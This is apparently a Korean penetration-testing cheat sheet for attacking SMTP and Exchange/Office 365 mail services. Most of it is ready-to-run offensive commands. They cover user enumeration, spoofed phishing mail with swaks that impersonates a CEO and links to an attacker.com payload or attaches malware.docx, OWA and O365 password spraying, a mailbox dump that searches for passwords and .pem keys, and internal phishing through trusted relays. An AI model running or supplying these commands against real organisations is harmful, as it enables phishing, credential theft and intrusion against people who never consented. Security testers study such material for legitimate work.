# SMTP (25/465/587)

Simple Mail Transfer Protocol. 메일 전송. 사용자 열거, 메일 스푸핑, 피싱에 활용.

---

## 열거

```bash
nmap -sV -sC -p 25,465,587 TARGET
nmap --script=smtp-commands,smtp-ntlm-info -p 25 TARGET

# 배너 그래빙
nc -nv TARGET 25
telnet TARGET 25
```

---

## 사용자 열거

```bash
# VRFY 명령 (사용자 존재 확인)
telnet TARGET 25
VRFY admin
VRFY root
VRFY user

# EXPN (메일링 리스트 확장)
EXPN admin

# RCPT TO (수신자 확인)
MAIL FROM:<test@test.com>
RCPT TO:<admin@domain.com>
# 250 = 존재, 550 = 미존재

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET -D domain.com

# nmap
nmap --script=smtp-enum-users -p 25 TARGET
```

---

## 메일 전송 (피싱/스푸핑)

```bash
# Open Relay 확인
nmap --script=smtp-open-relay -p 25 TARGET

# swaks (Swiss Army Knife for SMTP)
swaks --to victim@domain.com --from ceo@domain.com --server TARGET \
  --header "Subject: Urgent" --body "Click here: http://attacker.com/payload"

# 첨부 파일 포함
swaks --to victim@domain.com --from ceo@domain.com --server TARGET \
  --header "Subject: Invoice" --attach @malware.docx

# 인증 필요 시
swaks --to victim@domain.com --from user@domain.com --server TARGET \
  --auth LOGIN --auth-user user@domain.com --auth-password pass
```

---

## NTLM 정보 노출

```bash
# SMTP NTLM 인증을 통한 내부 정보 노출
nmap --script=smtp-ntlm-info -p 25 TARGET
# → 내부 호스트명, 도메인, DNS 이름 등 노출
```

---

## Nmap NSE

```bash
nmap --script=smtp-commands -p 25 TARGET
nmap --script=smtp-enum-users -p 25 TARGET
nmap --script=smtp-open-relay -p 25 TARGET
nmap --script=smtp-vuln-cve2010-4344 -p 25 TARGET
```

---

## Exchange / Office 365

외부에 노출된 Exchange / OWA / EWS / ActiveSync 는 SMTP 자체보다 더 넓은 공격 면을 가진다.

### 버전 식별

```bash
# OWA 버전 노출 (Exchange)
curl -sI https://mail.target.com/owa/ | grep -i x-owa-version
curl -s https://mail.target.com/owa/auth/logon.aspx | grep -oE "/owa/auth/[0-9.]+/"

# Autodiscover
curl -s https://autodiscover.target.com/autodiscover/autodiscover.xml
```

### 사용자 / credential 공격

```bash
# MailSniper - 사용자 열거, password 스프레이, 메일 검색
# 사용자 존재 유무 (timing-based)
Invoke-UsernameHarvestOWA -ExchHostname mail.target.com -UserList users.txt -OutFile valid.txt

# OWA password 스프레이
Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList valid.txt -Password 'Spring2026!'

# EWS 메일박스 dump
Invoke-GlobalMailSearch -ImpersonationAccount admin -ExchHostname mail.target.com -Terms ("password","vpn","*.pem")

# o365spray - Office 365 사용자 열거 / 스프레이
o365spray --validate --domain target.com
o365spray --enum -U users.txt --domain target.com
o365spray --spray -U valid.txt -p 'Spring2026!' --domain target.com --count 1 --lockout 15
```

### ProxyShell / ProxyNotShell 등 주요 CVE

```text
CVE-2021-26855  SSRF (ProxyLogon)
CVE-2021-34473  Pre-auth RCE (ProxyShell)
CVE-2022-41040  SSRF (ProxyNotShell)
CVE-2022-41082  Authenticated RCE (ProxyNotShell)
```

```bash
nmap -p 443 --script http-vuln-cve2021-26855 TARGET
```

---

## 내부 relay / 피싱

내부 네트워크 / 침투 후 신뢰된 메일 서버로 내부 피싱 발송.

```bash
# 신뢰된 내부 SMTP relay (인증 없이 허용되는 내부 범위가 많음)
swaks --to finance@target.com --from helpdesk@target.com \
  --server internal-mail.target.local \
  --header "Subject: [Urgent] Password reset required" \
  --body @phish.html --add-header "Content-Type: text/html"

# DKIM/SPF/DMARC 확인 - 외부에서 스푸핑 가능 여부 판단
dig target.com TXT | grep -iE 'spf|dmarc'
dig default._domainkey.target.com TXT
```

---

## 메일 header 분석 (리컨)

수신된 메일의 header로 내부 구조 파악:

```text
Received:  내부 메일 게이트웨이 / 허브 호스트명
X-MS-Exchange-Organization-*: Exchange 내부 GUID / 테넌트 정보
X-Originating-IP: 송신자 내부 IP (차단 안된 경우)
User-Agent / X-Mailer: 클라이언트 버전
```
